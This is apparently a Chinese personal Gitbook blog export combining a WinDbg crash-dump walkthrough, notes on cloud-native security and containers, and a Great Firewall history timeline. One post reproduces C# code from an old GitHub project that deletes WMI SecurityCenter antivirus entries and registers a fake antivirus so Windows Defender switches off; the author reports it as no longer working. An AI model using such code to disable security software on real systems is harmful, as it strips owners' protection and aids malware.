接下来是关于本机这个报错时的四个参数，这来自Windows内核的Bug 检查机制 Bug 检查会显示蓝屏信息，记录关键的Bug 检查代码与参数等信息，并转储内核的内存与寄存器状态。 Arguments: Arg1: ffffcf07d379a230， memory referenced // 导致无效访问的内存地址 Arg2: 0000000000000002， IRQL // 当前的IRQL级别 Arg3: 0000000000000001， bitfield : bit 0 : value 0 = read operation， 1 = write operation bit 3 : value 0 = not an execute operation， 1 = execute operation (only on chips which support this level of status) // 无效访问的类型(读/写/执行) Arg4: fffff8031391807f， address which referenced memory // 导致此无效访问的调用地址 每个 bug 检查代码都有四个关联的参数，用于提供信息。可以通过windbg中的命令：!analyze -show 来查看 针对每个报错的信息的bug检查代码的参数的解释可以从这里找到：https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/bug-check-code-reference2 可以通过命令!analyze -show 来指定第一个参数的值 想显示后面的某一个参数，不能跳，不能用空格代替，直接输入0就行，如下图 本次报错的bug检查函数的四个参数的详细内容在这里：https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/bug-check-0xa--irql-not-less-or-equal KEY_VALUES_STRING KEY_VALUES_STRING: 1表示此转储信息包含1组KEY_VALUES_STRING数据。这一组键值表示了发生crash的时候一些环境状况，对于一般分析来说没啥用。 KEY_VALUES_STRING的值提供了此内核转储的相关分析信息和属性。它们代表的意义如下: Analysis.CPU.mSec: 内核分析使用的CPU时间，单位ms。 Analysis.DebugAnalysisManager: 当前使用的WinDbg分析管理器名称。 Analysis.Elapsed.mSec: 内核分析总耗时，单位ms。 Analysis.IO.Other.Mb: 内核分析过程中的其他IO操作数据量，单位Mb。 Analysis.IO.Read.Mb: 内核分析过程中的读IO操作数据量，单位Mb。 Analysis.IO.Write.Mb: 内核分析过程中的写IO操作数据量，单位Mb。 Analysis.Init.CPU.mSec: WinDbg初始化内核分析使用的CPU时间，单位ms。 Analysis.Init.Elapsed.mSec: WinDbg初始化内核分析总耗时，单位ms。 Analysis.Memory.CommitPeak.Mb: 内核分析过程中内存占用峰值，单位Mb。 Bugcheck.Code.DumpHeader: 转储文件头部记录的Bug 检查代码，0xa代表IRQL_NOT_LESS_OR_EQUAL。 Bugcheck.Code.Register: 寄存器记录的Bug 检查代码，0xa代表IRQL_NOT_LESS_OR_EQUAL。 Dump.Attributes.AsUlong: 转储文件的属性值。 Dump.Attributes.DiagDataWrittenToHeader: 转储文件头部是否包含诊断数据，1表示包含。 Dump.Attributes.ErrorCode: 转储产生的错误代码，0表示无错误。 Dump.Attributes.KernelGeneratedTriageDump: 是否由内核生成的修复转储，1表示是。 Dump.Attributes.LastLine: 转储操作的最后一行结果，这里显示转储成功完成。 Dump.Attributes.ProgressPercentage: 转储文件头部记录的转储操作进度百分比，此处未记录。 FILE_IN_CAB FILE_IN_CAB: 061023-11093-01.dmp表示此转储文件原来包含在名为061023-11093-01.cab的CAB压缩包中。 在Windows故障转储的传输和处理过程中，多个转储文件通常被压缩成.cab格式的压缩包进行传输，以减小文件大小，便于传输和存储。一旦需要分析其中的某个转储文件，会先从.cab压缩包中将其提取出来，然后加载到WinDbg等转储分析工具中进行分析。 所以这行信息，是WinDbg在加载此转储文件时，从转储文件本身提取的元数据，它记录了此转储文件原来打包在名为061023-11093-01.cab的CAB压缩包中的事实。 对于分析来说没有实际意义。 DUMP_FILE_ATTRIBUTES DUMP_FILE_ATTRIBUTES: 0x1808 表示此转储文件的属性值为0x1808。 0x1000: 内核生成的修复转储(Kernel Generated Triage Dump) 0x0800: 包含诊断数据的转储文件头 0x0008: 转储操作成功完成 所以关于这个特性的解释就是： 此转储文件属于内核生成的修复转储(Kernel Generated Triage Dump) 此转储文件的头部包含诊断数据 此转储操作成功完成 没啥用处，就是告诉你在生成这个转储文件的时候很成功，没有发生意外和中断。 这下面的几个BUGCHECK和前面最开始展示的四个参数是一个东西 就是分开说了一下，没啥用。 再往下就是这个信息，这个信息主要是windbg在分析此转储文件时,尝试从转储获取一些重要的内存布局信息失败了,所以无法确定地址fffffcf07d379a230是否属于可写内存区域。 WRITE_ADDRESS: fffff8031431c468: Unable to get MiVisibleState //可见内存页的状态信息 Unable to get NonPagedPoolStart //非分页内存池的起始和结束地址 Unable to get NonPagedPoolEnd Unable to get PagedPoolStart //分页内存池的起始和结束地址 Unable to get PagedPoolEnd unable to get nt!MmSpecialPagesInUse //正在使用的特殊内存页信息 ffffcf07d379a230 由于获取这些信息失败,所以WinDbg无法判断地址fffffcf07d379a230是否可写,只能输出一条警告信息。 一般在下面三种情况下会发生这种情况，2比较常见的可能。 此转储已损坏,关键内存布局信息丢失或损坏 此转储属于修复转储或转储级别较低,未包含上述信息 系统内存布局发生变化,WinDbg版本较旧无法正确解析 BLACKBOXBSD BSD/BSOD Berkeley Software Distribution或Berkeley Standard Distribution的缩写，一般是FreeBSD等操作系统的简称，这里指的是Blue screen of death 这3条信息表示WinDbg加载了黑箱扩展(BlackBox Extension)来分析此转储文件。 BLACKBOXBSD: 1 (!blackboxbsd) 加载了 blackboxbsd.dll 扩展来分析BSD磁盘子系统相关的问题。 BLACKBOXNTFS: 1 (!blackboxntfs) 加载了 blackboxntfs.dll 扩展来分析NTFS文件系统相关的问题。 BLACKBOXPNP: 1 (!blackboxpnp) 加载了 blackboxpnp.dll 扩展来分析即插即用(PnP)与电源管理相关的问题。没啥用，除非你超频了 黑箱扩展由微软提供,包含许多专门用于分析Windows内核和驱动程序相关子系统的脚本与工具。通过加载不同的黑箱扩展,WinDbg可以自动进行驱动和系统服务相关的分析来查找潜在问题。这里可以直接点击后面的命令查看不同的详细信息。 报错进程和次数 这是关键的部分，它直白的告诉你是哪里发生的报错和这是第几次发生的报错 本机报错是由msedge.exe进程导致的，这是edge浏览器的主进程，这正好对应了我在关闭浏览器时发生蓝屏的时间节点。 寄存器状态 trap frame 无论3环是从中断门还是systementer进入0环，3环的寄存器都会寄存在_Trap_Frame结构体中，通过命令dt _KTrap_Frame可以从windbg中查看该结构体 6: kd> dt _KTrap_Frame nt!_KTRAP_FRAME +0x000 P1Home : Uint8B +0x008 P2Home : Uint8B +0x010 P3Home : Uint8B +0x018 P4Home : Uint8B +0x020 P5 : Uint8B +0x028 PreviousMode : Char +0x028 InterruptRetpolineState : UChar +0x029 PreviousIrql : UChar +0x02a FaultIndicator : UChar +0x02a NmiMsrIbrs : UChar +0x02b ExceptionActive : UChar +0x02c MxCsr : Uint4B +0x030 Rax : Uint8B +0x038 Rcx : Uint8B +0x040 Rdx : Uint8B +0x048 R8 : Uint8B +0x050 R9 : Uint8B +0x058 R10 : Uint8B +0x060 R11 : Uint8B +0x068 GsBase : Uint8B +0x068 GsSwap : Uint8B +0x070 Xmm0 : _M128A +0x080 Xmm1 : _M128A +0x090 Xmm2 : _M128A +0x0a0 Xmm3 : _M128A +0x0b0 Xmm4 : _M128A +0x0c0 Xmm5 : _M128A +0x0d0 FaultAddress : Uint8B +0x0d0 ContextRecord : Uint8B +0x0d8 Dr0 : Uint8B +0x0e0 Dr1 : Uint8B +0x0e8 Dr2 : Uint8B +0x0f0 Dr3 : Uint8B +0x0f8 Dr6 : Uint8B +0x100 Dr7 : Uint8B +0x0d8 ShadowStackFrame : Uint8B +0x0e0 Spare : [5] Uint8B +0x108 DebugControl : Uint8B +0x110 LastBranchToRip : Uint8B +0x118 LastBranchFromRip : Uint8B +0x120 LastExceptionToRip : Uint8B +0x128 LastExceptionFromRip : Uint8B +0x130 SegDs : Uint2B +0x132 SegEs : Uint2B +0x134 SegFs : Uint2B +0x136 SegGs : Uint2B +0x138 TrapFrame : Uint8B +0x140 Rbx : Uint8B +0x148 Rdi : Uint8B +0x150 Rsi : Uint8B +0x158 Rbp : Uint8B +0x160 ErrorCode : Uint8B +0x160 ExceptionFrame : Uint8B +0x168 Rip : Uint8B +0x170 SegCs : Uint2B +0x172 Fill0 : UChar +0x173 Logging : UChar +0x174 Fill1 : [2] Uint2B +0x178 EFlags : Uint4B +0x17c Fill2 : Uint4B +0x180 Rsp : Uint8B +0x188 SegSs : Uint2B +0x18a Fill3 : Uint2B +0x18c Fill4 : Uint4B 借用csdn中的一位博主的图片：我是win11 64位的，这个图片环境未知，所以有些出入。 这里记录的是发生错误的时候寄存器的状态，其中蓝色的字体Some register values may be zeroed or incorrect.证明了这个dump发生在低等级下，所以寄存器的值并不是全的，内核未能捕获全部寄存器状态。 rip和栈信息(rsp、rbp)是我们判断崩溃原因最关键的信息。我们可以通过rip找到导致崩溃的指令,通过栈桢回溯调用过程。其他寄存器的值也可能提供一定上下文信息帮助分析。 下面还有一行奇怪的玩意： iopl=0 nv up ei pl zr na po nc 是此trap frame提供的CPU状态标志信息。 其中,每个标志的含义如下： iopl - I/O特权级,0表示处于用户模式 nv - 溢出标志 up - 协处理器使用标志 ei - 中断使能标志 pl - 特权级标志,0表示处于特权级0 zr - 零标志 na - 辅助进位标志 po - 奇偶标志 nc - 进位标志 这些标志描述了CPU在发生trap时的状态与模式。其实这就是哪些ZF OF寄存器的另一种表示方式。 OV = OVerflow, NV = No oVerflow. DN = DowN, UP (up). EI = Enable Interupt, DI = Disable Interupt. NG = NeGative, PL = PLus; a strange mixing of terms due to the fact that 'Odd Parity' is represented by PO (rather than POsitive), but they still could have used 'MI' for MInus. ZR = ZeRo, NZ = Not Zero. AC = Auxiliary Carry, NA = Not Auxiliary carry. PE = Parity Even, PO = Parity Odd. CY = CarrY, NC = No Carry. 此trap发生于用户模式(iopl=0, pl=0) 没有溢出或进位(nv=0, nc=0) 没有使用FPU(up=0) 中断已使能(ei=1) 当前无零结果(zr=0) 所以,这些标志信息可以辅助判断导致此trap的代码在什么模式下执行的。但是看这里只是给出了寄存器，但是没有数值，应该是内核并没有进行保存。 崩溃时的指令 这里给出了定位到汇编粒度的位置，这条信息的代表了，在执行到ntoskrnl.exe中的KiAcquireKobjectLockSafe函数偏移位置为0xf的指令lock bts dword ptr [rcx],7 ds:ffffcf07d379a230=00060000的时候，发生的报错（f00fba2907是这个指令的字节码）。 这里代码的具体含义是：以互斥方式修改内存地址ffffcf07`d379a230的第7位。然后就发生了crash。 堆栈信息 这里的堆栈信息显示的是栈回溯信息，可以看到直到发生报错的时候，当前栈上的调用链。它反映了错误堆栈的调用情况。程序执行顺序是从下面往上面走的，可以看到最上面的函数是KeBugCheckEx。 STACK_TEXT: ffffb585`92d6f0d8 fffff803`13a417a9 : 00000000`0000000a ffffcf07`d379a230 00000000`00000002 00000000`00000001 : nt!KeBugCheckEx ffffb585`92d6f0e0 fffff803`13a3ce34 : 00000000`00000001 ffffb585`92d6f7d0 00000000`00000000 00000000`00000001 : nt!KiBugCheckDispatch+0x69 ffffb585`92d6f220 fffff803`1391807f : 00000000`00000000 fffff803`1383d78a 00000000`00000010 00000000`00050282 : nt!KiPageFault+0x474 ffffb585`92d6f3b0 fffff803`1383d7eb : ffff910c`f1ded080 ffffcf07`d379a230 00000000`00000000 00000000`00000000 : nt!KiAcquireKobjectLockSafe+0xf ffffb585`92d6f3e0 fffff803`13bb7df2 : ffff910c`00000001 ffffb585`92d6f749 00000000`00000000 ffffb585`92d6f7d0 : nt!KeSetEvent+0x6b ffffb585`92d6f470 fffff803`13938673 : 00000000`00000000 00000000`00000001 ffff910c`f1ded080 ffffcf08`3658b750 : nt!PsDispatchIumService+0x96e ffffb585`92d6f6e0 fffff803`13f589d7 : 00000001`400000d0 ffff910d`135440c0 ffff910d`13544518 00000000`0000000b : nt!VslpEnterIumSecureMode+0x287 ffffb585`92d6f7b0 fffff803`13b893b1 : 00000000`0000000b 00000000`000000a0 00000000`00000000 ffffcf08`2c7978b8 : nt!VslRundownSecureProcess+0x47 ffffb585`92d6f860 fffff803`13eb4315 : ffffcf08`2c7978b0 ffffcf08`2c797860 ffffcf08`2c7978a0 fffff803`13cef7c8 : nt!KeRundownSecureProcess+0x15 ffffb585`92d6f890 fffff803`13cf15ca : ffff910d`135440c0 ffffcf08`18720060 ffff910d`135440c0 00000000`00000000 : nt!PspRundownSingleProcess+0x224e41 ffffb585`92d6f920 fffff803`13d7c402 : 00000000`00000000 ffff910d`13544001 ffff910c`f1ded0f4 00000018`a0587000 : nt!PspExitThread+0x64e ffffb585`92d6fa20 fffff803`13a40ee8 : ffff910c`0000169c ffff910c`f1ded080 ffff910d`135440c0 ffff910d`135440c0 : nt!NtTerminateProcess+0xf2 ffffb585`92d6faa0 00007ffe`d968f1d4 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x28 00000018`a0dffb78 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : 0x00007ffe`d968f1d4 可以将上面的数据分为4栏，最后一栏是函数的符号名称，可以看到基本都是在nt里的函数，都定位到了一些偏移的具体位置；中间一栏是函数的四个参数，用空格隔开。 这个可以通过k命令或者kb命令来看得到类似的结果。 结尾 SYMBOL_NAME: nt!KiAcquireKobjectLockSafe+f # 发生报错的符号名称（函数名称） MODULE_NAME: nt # 发生报错的模块名称，这里是内核 IMAGE_NAME: ntkrnlmp.exe # 发生错误的镜像名称 IMAGE_VERSION: 10.0.22621.1778 # 映像的版本号 STACK_COMMAND: .cxr; .ecxr ; kb # 一些命令 BUCKET_ID_FUNC_OFFSET: f # 对应发生报错地址的函数里的偏移 FAILURE_BUCKET_ID: AV_nt!KiAcquireKobjectLockSafe # 显示此问题的唯一桶ID OSPLATFORM_TYPE: x64 # 系统位数 OSNAME: Windows 10 # 系统名称，我是win11，内核版本还是win10 FAILURE_ID_HASH: {87978629-0a82-b7ad-caa7-eb2c5ba684a3} # 对应这个错误的hash值 Followup: MachineOwner --------- 总结 使用windbg对dump文件进行分析，关键就是一个映像的名称，报错信息，进程名称还有一个堆栈信息，一般如果是Windows自己的程序和应用和内核发生了错误基本就无解了，比如这个dump文件显示的内容。 这个分析主要是对dump里显示的内容的每一个条目的原理和内容进行学习，主要是偏重于内容的分析解释而不是操作的过程。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 12:08:05 "},"MyArticles/Practice/shutdownWinDefender.html":{"url":"MyArticles/Practice/shutdownWinDefender.html","title":"失效的欺骗 - 假杀软欺骗真winDef","keywords":"","body":"起源 https://github.com/Tlaster/YourAV 在github发现一个古老的项目，通过在安全中心注册一个杀毒软件，来让windef自动关闭。通过这个项目也让我知道了windef是如何知道第三方杀软存在，并且关闭的。之前我的猜测是杀软厂家向微软申请了证书，windef通过这个证书来判断是否存在第三方杀软的。现在才发现，没这么麻烦。 项目测试过已经失效了，他还是使用的wmi，但是wmi已经是在powershell问世之前的东西了，他本身都过时了，针对他的操作更失效了肯定。 核心代码 思路就是：遍历数据库，删除所有的非windef杀软实例，然后根据个人的输入（AddAntivirus(string displayName, string instanceGuid)这个函数）添加自定义的杀软实例。以此达到目的。 private static readonly string wmipathstr = @\"\\\\\" + Environment.MachineName + @\"\\root\\SecurityCenter:AntiVirusProduct\"; public static bool RemoveAllAntivirus() { try { // 从上述数据库的AntivirusProduct表中搜索所有条目 ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, \"SELECT * FROM AntivirusProduct\"); ManagementObjectCollection instances = searcher.Get(); // 不是windef的就删掉 foreach (ManagementObject obj in instances) if (obj.GetPropertyValue(\"displayName\").ToString() != \"Windows Defender\") obj.Delete(); return true; } catch { return false; } } public static bool AddAntivirus(string displayName, string instanceGuid) { try { // 创建新实例 ManagementClass avp = new ManagementClass(wmipathstr); ManagementObject status = avp.CreateInstance(); // 设置新实例的信息 status.SetPropertyValue(\"displayName\", displayName); status.SetPropertyValue(\"instanceGuid\", $\"{{{instanceGuid}}}\"); status.SetPropertyValue(\"productUptoDate\", true); status.SetPropertyValue(\"onAccessScanningEnabled\", true); // 提交新实例 status.Put(); return true; } catch { return false; } } public static bool IsAntivirusInstalled() { try { ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, \"SELECT * FROM AntivirusProduct\"); ManagementObjectCollection instances = searcher.Get(); // 判断实例数量大于0且存在非Windows Defender的杀毒软件 return instances.Count > 0 && instances.Cast().Any(item => item.GetPropertyValue(\"displayName\").ToString() != \"Windows Defender\"); } catch { return false; } } 接下来的就是 一些辅助函数了 重启服务 public static bool RestartService(string serviceName) { // serviceName = “Windows Management Instrumentation” ServiceController service = new ServiceController(serviceName); try { List dependencies = new List(); if ((service.Status.Equals(ServiceControllerStatus.Running)) || (service.Status.Equals(ServiceControllerStatus.StartPending))) { FillDependencyTreeLeaves(service, dependencies); service.Stop(); } service.WaitForStatus(ServiceControllerStatus.Stopped); foreach (ServiceController dependency in dependencies) { dependency.Start(); dependency.WaitForStatus(ServiceControllerStatus.Running); } return true; } catch { return false; } } private static void FillDependencyTreeLeaves(ServiceController controller, List controllers) { bool dependencyAdded = false; foreach (ServiceController dependency in controller.DependentServices) { ServiceControllerStatus status = dependency.Status; // add only those that are actually running if (status != ServiceControllerStatus.Stopped && status != ServiceControllerStatus.StopPending) { dependencyAdded = true; FillDependencyTreeLeaves(dependency, controllers); } } // if no dependency has been added, the service is dependency tree's leaf if (!dependencyAdded && !controllers.Contains(controller)) { controllers.Add(controller); } } 如果服务当前正在运行,则首先获取保存该服务的所有依赖服务，然后停止要重启的服务，等待服务完全停止。 遍历依赖服务列表,启动所有依赖服务,并等待启动完毕。 FillDependencyTreeLeaves函数用来递归获取一个服务的所有依赖服务的。 vs找不对对应的net框架版本 vs2022打开一些老项目可能会找不到项目的net框架版本，比如4.0就已经停止支持了。一般情况下是可以通过visual studio intaller去下载。 但是这里仅仅显示受支持的包，这里需要手动下载4.0，在nuget上可以找到NuGet Gallery | Microsoft.NETFramework.ReferenceAssemblies 1.0.3，当然这里最简单的就是下载一个visual2019去下载就可以了。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-28 09:32:30 "},"MyArticles/云原生安全.html":{"url":"MyArticles/云原生安全.html","title":"云原生安全","keywords":"","body":"随着社会生产技术和科技进步的发展，人们对于互联网的要求逐渐提高，传统的终端开发模式逐渐不能适应开发的实际需要，云服务应运而生，而云原生作为云服务的下半场的主宰，有着举足轻重的地位，谁能掌握云原生，谁就能掌握未来安全的发展方向。 以上观点是我自己的，受历史局限性和认知局限性的影响，和现实发展情况可能存在偏差，到时候再说。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 11:27:42 "},"MyArticles/云原生安全/云原生安全 -云原生.html":{"url":"MyArticles/云原生安全/云原生安全 -云原生.html","title":"云原生 - 是什么","keywords":"","body":"资产上云是一种趋势，云凭借高算力、易运维、资源拓展方便，安全性相对较高等优点，被逐渐使用广泛云原生是云计算发展的一种趋势，他不是一个具体的技术，而是一种大的方式，类似于TCP/IP协议一样。随着越来越多的业务上云，以及近年来针对云服务的攻击愈发激烈，所以云原生安全是未来安全领域的一大热点方向，虽然不会取代终端安全，但是会抢占绝大多数的终端安全资源和岗位。 ctrl+.可以解决输入的符号都变西文的问题 是什么 云计算的下半场。终端安全对应的应该是云原生安全，而不是云安全，因为部分云安全仍谈具有终端安全的特性，只不过是将之前的本地部署变到了云服务器部署，实际的安全和运维状态发生了部分技术上的变化，而总体思路还是传统终端安全的思路。 概况 云原生，就是从云上原生的技术、服务、软件等等，这些东西是云生出来的，他们天生具有云的特性，而不是简单的上云运动（将之前跑在本地或者本地服务器的服务，通过硬盘挪移，文件上载等传统形势，把物理基本从自己的服务器换到了云厂商提供的服务器上）。 CNCF是中华穿越火线联盟或者是指云原生基金会。 这个基金会主要的目的就是推进一个云原生的标准化进程，因为只有标准化的云原生架构构建，才能推进之后的云原生快速发展。该基金会在2017年提出了一个开放容器标准(OCI)。 组成 云原生的组成或者说是任何计算机的架构组织，都可以分为硬件组织和软件组织，这里我基于自己的理解来分类云原平台的组成。 硬件 云原生云原生，最重要的就是云，这个云就是指的是一些厂商的提供的对外开放的服务器，所以这里最重要的就是服务器，需要强大的服务器硬件来存放这些云服务。这就需要强大的CPU和内存、硬盘等硬件设施。 除了服务器基础，还需要粗大的网线和交换机来支撑住这些大量的访问请求，和网络通信带宽。 同时需要从根本上做好安全保护，需要独立的机房和自动化的冷却系统和异地容灾系统，这都是需要注意的地方。还有就是先进有力的安保系统，强大的保安可以挡住绝大多数的物理攻击和破坏。 软件 目前主流的方案是： 容器 + 管理系统 在落实下来一般就是docker负责容器和镜像，然后搭配k8s进行统一的调度和管理。 docker自己作为容器，缺点是无法大规模的部署和操作；k8s就是负责来提供一个容器和宿主机之间的中间层，来批量的部署、管理、交互这些容器。 特征 轻快和不变的基础设施 云的支撑基础设施是容器，容器生命周期短、占用资源少，所以既清又快，一般情况下升级服务都是直接更新镜像而不是更新容器内的应用。 通过编排系统下载新的镜像并启动相应的容器，并将就的容器删除 这种模式称为“不变的基础设施” 弹性的服务编排 云原生的关注点是业务，初衷也是为了让技术人员更多的关注业务，不要再平台运维上耽误过多的时间。服务编排（orchestration）可以按需弹性的控制服务的位置，容量，版本等内容 开发运营一体化 就是常说的Devops，将软件开发和IT运营结合的实践 历史 这个东西之前还存在两种东西 传统开发的“瀑布式模型” 敏捷开发 瀑布式模型： 就是一步步往下走的模式，但是如果客户在中途提出了新的需求或者改变了策略，瀑布就需要倒流回去，后面的步骤就没活干，前面的步骤就累到死。 这时候就推出了新的模型：Agile Development、敏捷开发： 就是把大项目变成小项目，把大时间点变成小时间点。这样加强合作，就可以提高效率，应对突发改变 因为他使用了小步快跑的模式，所以当上一步出现问题时，不会造成剧烈的影响，就可以直接下一个版本进行改正，减少出现重大失误的情况，而且因为步子小，出现错误的修复成本也小。 但是这种方式从上图中可以看到，开发和测试合并了，但是运维还是祖传的模式，旧模式适应新框架是弱智的选择，而且还存在一定的推诿扯皮，所以就产生了devops这种开发模式 devops DevOps是一组过程、方法与系统的统称，用于促进开发、技术运营和质量保障（QA）部门之间的沟通、协作与整合。 他是对敏捷开发的有益补充。正因为他的抽象的概念，所以有人将他认为是一种宗教也在情理之中。 误区：DevOps，就是Dev+Ops嘛，把两个团队合并，或者将运维划归开发。 在DevOps的流程下，运维人员会在项目开发期间就介入到开发过程中，了解开发人员使用的系统架构和技术路线，从而制定适当的运维方案。而开发人员也会在运维的初期参与到系统部署中，并提供系统部署的优化建议。 对应到阶段图就是 将三者进行合并，他的重点是消除开发和运营的矛盾 微服务 顾名思义，就是将一个大的功能主体进行拆分成细小的服务个体，针对每一个个体进行开发和测试。微服务架构下，不同的工程师可以对各自负责的模块进行处理，例如开发、测试、部署、迭代。 开始的时候组件一般集中的部署在服务器上，后来随着web server标准的推出，应用按照标准的服务交付，应用间通过RPC（远程服务调用）的方式进行交互，形成了面向服务的架构（Service-Oriented Architecture SOA）。 微服务应用到云原生上的表现形势就是，传统的单体应用功能被拆分，这使得每一个服务聚焦在自己的功能上，然后利用“应用编排”进行组装，进而实现等价于传统个体的复杂功能，这提高了代码的复用性，再后续的升级中，不用去关注代码的内部实现，只需要能用即可（条条大路通罗马） 无服务 Serverless，这是一个抽象的模型，基于代码和计算任务执行的云计算。与之相对的是基于服务器的计算模式。是一种云原生开发模型，可使开发人员专注构建和运行应用，而无需管理服务器。 无服务器方案中仍然有服务器，但它们已从应用开发中抽离了出来。云提供商负责置备、维护和扩展服务器基础架构等例行工作。开发人员可以简单地将代码打包到容器中进行部署。部署之后，无服务器应用即可响应需求，并根据需要自动扩容。公共云提供商的无服务器产品通常通过一种事件驱动执行模型来按需计量。因此，当无服务器功能闲置时，不会产生费用。 可以看作是一个服务器和应用的中间层，类似于shell一样，开发人员只需要将自己的服务进行部署即可，省去了复杂的运维和配置过程，而这些过程是由提供商负责的，专业的人做专业的事，提高效率。 总结 云原生是以云的模式管理和部署资源，而不是简单的将资产放到云端的过程。用户看到的不是IT系统或者是虚拟主机之类的东西，而是一个个独立但是有联系的业务单元，开发者的精力重新回归到业务本身。 微服务、Serverless是云原生理念的核心体现；容器、编排、服务网格是云原生的支撑技术。 容器历史 主要和最常使用的就是docker了。 linux原生隔离 linux在07年就根据自己的内核特性，推出了两种隔离特性，namespaces和cgroup。并且根据这俩特性推出了一个容器机制：Linux Container（LXC）并且进行推广使用，但是这个技术有局限性，他是对软件层面的容器打包，适合在相同配置的机器间进行移动，不能在不同配置的主机间移动，因为他只是打包了软件层，需要的一些libc没有得到打包。 Namespaces 进程资源隔离限制。这里控制了他可以看到哪些进程，可以看到哪些网络信息等。 每个namespace都有一个独立的全局资源实例 Cgroup 进程资源使用限制（control groups）。来自linux内核的功能，控制可以用多少的内存资源，多少的CPU资源等。 docker docker在上述的linux原生的基础上，不仅仅打包了文件系统，同时还打包了一些底层运行库和OS的文件系统，保证了在容器上的应用可以任意迁移，一次开发持续使用的目的。 但是在一些关于需要用到内核服务的应用上，docker依旧存在不小的弊端，因为他还是基于宿主机的内核来为自己提供服务的。 docker的镜像和传统的镜像还是有不小的区别的，虽然都是镜像。在云安全中，镜像投毒也是一种危害广泛的攻击方式。 Docker 镜像就是一个只读的模板。一个镜像可以包含一个完整的 ubuntu 操作系统环境，里面仅安装了 Apache 或用户需要的其它应用程序。docker通过镜像创建容器，容器依赖于镜像。 注：镜像是只读的，容器在启动的时候创建一层可写层作为最上层。 所以可以通过更新镜像的方式来更新服务。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 11:40:30 "},"MyArticles/Dailynotes.html":{"url":"MyArticles/Dailynotes.html","title":"Daily notes","keywords":"","body":"天不得时，日月无光；地不得时，草木不生；水不得时，风浪不平；人不得时，利运不通。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:40:11 "},"MyArticles/Dailynotes/G-F-W原理了解学习.html":{"url":"MyArticles/Dailynotes/G-F-W原理了解学习.html","title":"G-F-W原理了解学习","keywords":"","body":"GFW（即Great Wall of China, 中国防火长城的简称，起源于1998年）作为一种分布式的网络出入监控设备（分布式的入侵检测系统），并不能算是一种防火墙，因为他的功能比防火墙更多一些。 作为中国政府过滤和监控互联网的一套软硬件系统。GFW的作用主要是用于分析和过滤中国境内外网络间的互相访问。 遇到的困难 作为一种网络监控技术，据说始作俑者为方滨兴院士，该院士在《云原生安全》此书中也有作序推荐。 作为平时对抗最多的一个对象，基本平时都会用到，但是无法找到更加详细的资料进行描述。我在知网、万方等知识平台上并未找到任何相关的文章，可见作为一种完全闭源并且多少占点保密性质的防御对抗系统来说，研究学习的成本极度上升，但是通过历年来的升级、失效、查杀、可能存在的泄露，也能窥到该系统的一些端倪。 发迹时间线 该时间线阐明了GFW的一个发展历史，包括作者的一个发展进程，没有啥实际作用的信息 1998年9月22日，公安部部长办公会议通过研究，决定在全国公安机关开展全国公安工作信息化工程――”金盾工程”建设。 1999年4月20日，公安部向国家计委送交金盾工程立项报告和金盾工程项目建议书。 1999年6月，国家计算机网络与信息安全管理中心成立，局级事业单位。 1999-2000年，在哈尔滨工业大学任教多年的方滨兴调任国家计算机网络与信息安全管理中心副总工程师。 1999年12月23日，国务院发文成立国家信息化工作领导小组，国务院副总理吴邦国任组长。其第一下属机构计算机网络与信息安全管理工作办公室设在已经成立的国家计算机网络与信息安全管理中心，取代计算机网络与信息安全管理部际协调小组，对”公安部、安全部、保密局、商用密码管理办公室以及信息产业部”等部门的网络安全管理进行组织协调。 2000-2002年，方滨兴在国家计算机网络与信息安全管理中心任总工程师、副主任、教授级高级工程师。 2000年4月20日，公安部成立金盾工程领导小组及办公室。 2000年5月，005工程开始实施。 2000年10月，信息产业部组建计算机网络应急处理协调中心。 2000年12月28日，第九届全国人民代表大会常务委员会第十九次会议通过《关于维护互联网安全的决定》。 2001年，方滨兴”计算机病毒及其预防技术”获国防科学技术三等奖，排名第一。 2001年，方滨兴获国务院政府特殊津贴、信息产业部”在信息产业部重点工程中出突出贡献特等奖先进个人”称号，中组部、中宣部、中央政法委、公安部、民部、人事部等联合授予”先进个人”称号。 2001年1月19日，国家计算机网络与信息安全管理中心上海分中心成立，位于上海市黄浦区中山南路508号6楼。国家计算机网络应急技术处理协调中心上海分中心是工业和信息化部直属的中央财政全额拨款事业单位。 2001年4月25日，”金盾工程”经国务院批准立项。 2001年7月，计算机网络与信息安全管理工作办公室批准哈尔滨工业大学建立国家计算机信息内容安全重点实验室，胡铭曾、方滨兴牵头。 2001年7月24日，国家计算机网络与信息安全管理中心广州分中心成立，位于广州市越秀区建中路2、4号。 2001年8月8日，国家计算机网络与信息安全管理中心组建国家计算机网络应急处理协调中心，缩写CNCERT/CC。 2001年8月23日，国家信息化领导小组重新组建，中央政治局常委、国务院总理朱镕基任组长。 2001年11月28日，国家计算机网络与信息安全管理中心上海互联网交换中心成立。提供”互联网交换服务，互联网骨干网华东地区数据交换，数据流量监测与统计，网间通信质量监督，交换中心设备维护与运行，网间互联费用计算，网间互联争议协调”，位于上海市黄浦区中山南路508号。 2001年11月28日，国家计算机网络与信息安全管理中心广州互联网交换中心成立，位于广州市越秀区建中路204号。 2001年12月，在北京的国家计算机网络与信息安全管理中心综合楼开始兴建。 2001年12月17日，国家计算机网络与信息安全管理中心湖北分中心成立。 2002年，方滨兴任中国科学院计算技术研究所客座研究员、博士生导师、信息安全首席科学家。2002-2006年，方滨兴在国家计算机网络与信息安全管理中心任主任、总工程师、教授级高级工程师，升迁后任其名誉主任。 2002年1月25日，报道称：”国家计算机网络与信息安全管理中心上海互联网交换中心日前开通并投入试运行，中国电信、中国网通、中国联通、中国吉通等4家国家级互联单位首批接入。中国移动互联网的接入正在进行之中，近期可望成为第五家接入单位。” 2002年2月1日，国家计算机网络与信息安全管理中心新疆分中心成立。 2002年2月25日，国家计算机网络与信息安全管理中心贵州分中心成立。 